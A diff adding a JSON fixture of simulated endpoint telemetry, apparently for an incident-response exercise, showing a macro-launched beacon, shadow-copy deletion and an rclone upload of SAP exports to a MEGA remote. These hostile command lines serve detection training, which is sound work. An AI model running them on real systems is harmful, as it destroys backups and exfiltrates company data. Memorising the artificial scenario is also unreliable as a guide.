@@ -1,0 +1,71 @@
+{
+  "WS-FIN-017": {
+    "agent_version": "7.12",
+    "last_seen": "2026-09-04T05:50:00Z",
+    "isolated": false,
+    "logged_on_user": "j.alrashid",
+    "processes": [
+      {"pid": 2201, "name": "OUTLOOK.EXE", "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "signed": true, "parent_pid": 1180, "started": "2026-09-04T05:03:00Z", "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"},
+      {"pid": 3050, "name": "chrome.exe", "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "signed": true, "parent_pid": 1180, "started": "2026-09-04T05:19:50Z", "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"}
+    ],
+    "network": []
+  },
+  "WS-ENG-042": {
+    "agent_version": "7.12",
+    "last_seen": "2026-09-04T09:00:00Z",
+    "isolated": false,
+    "logged_on_user": "a.khan",
+    "processes": [
+      {"pid": 3120, "name": "WINWORD.EXE", "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "signed": true, "parent_pid": 1180, "started": "2026-09-04T08:09:58Z", "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "cmdline": "WINWORD.EXE /n \"C:\\Users\\a.khan\\Downloads\\Design_Spec_v7.docm\""},
+      {"pid": 4412, "name": "svchosts.exe", "path": "C:\\Users\\a.khan\\AppData\\Roaming\\svchosts.exe", "signed": false, "parent_pid": 3120, "started": "2026-09-04T08:10:44Z", "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "cmdline": "svchosts.exe"},
+      {"pid": 4520, "name": "whoami.exe", "path": "C:\\Windows\\System32\\whoami.exe", "signed": true, "parent_pid": 4412, "started": "2026-09-04T08:31:20Z", "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "cmdline": "whoami /all"}
+    ],
+    "network": [
+      {"pid": 4412, "remote_ip": "45.147.230.221", "remote_port": 443, "protocol": "tcp", "connections_last_hour": 47, "period_seconds": 60.0, "jitter_pct": 1.8}
+    ]
+  },
+  "WS-IT-ADM-03": {
+    "agent_version": "7.12",
+    "last_seen": "2026-09-04T01:50:00Z",
+    "isolated": false,
+    "logged_on_user": "svc_backup",
+    "processes": [
+      {"pid": 5010, "name": "mstsc.exe", "path": "C:\\Windows\\System32\\mstsc.exe", "signed": true, "parent_pid": 1180, "started": "2026-09-04T01:29:40Z", "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "cmdline": "mstsc.exe /v:SRV-ERP-01"}
+    ],
+    "network": [
+      {"pid": 5010, "remote_ip": "10.30.1.11", "remote_port": 3389, "protocol": "tcp", "connections_last_hour": 1}
+    ]
+  },
+  "SRV-ERP-01": {
+    "agent_version": "7.12",
+    "last_seen": "2026-09-04T01:46:00Z",
+    "isolated": false,
+    "logged_on_user": "svc_backup",
+    "processes": [
+      {"pid": 7700, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe", "signed": true, "parent_pid": 7650, "started": "2026-09-04T01:41:20Z", "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "cmdline": "cmd.exe"},
+      {"pid": 7788, "name": "vssadmin.exe", "path": "C:\\Windows\\System32\\vssadmin.exe", "signed": true, "parent_pid": 7700, "started": "2026-09-04T01:41:50Z", "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "cmdline": "vssadmin.exe delete shadows /all /quiet"},
+      {"pid": 7801, "name": "rclone.exe", "path": "C:\\Users\\svc_backup\\AppData\\Local\\Temp\\rclone.exe", "signed": false, "parent_pid": 7700, "started": "2026-09-04T01:44:05Z", "sha256": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae", "cmdline": "rclone.exe copy D:\\SAP\\exports mega:staging --transfers 8"}
+    ],
+    "network": [
+      {"pid": 7801, "remote_ip": "31.216.148.10", "remote_port": 443, "protocol": "tcp", "connections_last_hour": 8, "bytes_out": 412000000}
+    ]
+  },
+  "SRV-FS-03": {
+    "agent_version": "7.12",
+    "last_seen": "2026-09-04T01:50:00Z",
+    "isolated": false,
+    "logged_on_user": "svc_backup",
+    "processes": [],
+    "network": []
+  },
+  "VA-SCANNER-01": {
+    "agent_version": "7.12",
+    "last_seen": "2026-09-04T03:10:00Z",
+    "isolated": false,
+    "logged_on_user": "svc_nessus",
+    "processes": [
+      {"pid": 910, "name": "nessusd", "path": "/opt/nessus/sbin/nessusd", "signed": true, "parent_pid": 1, "started": "2026-08-12T10:00:00Z", "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"}
+    ],
+    "network": []
+  }
+}
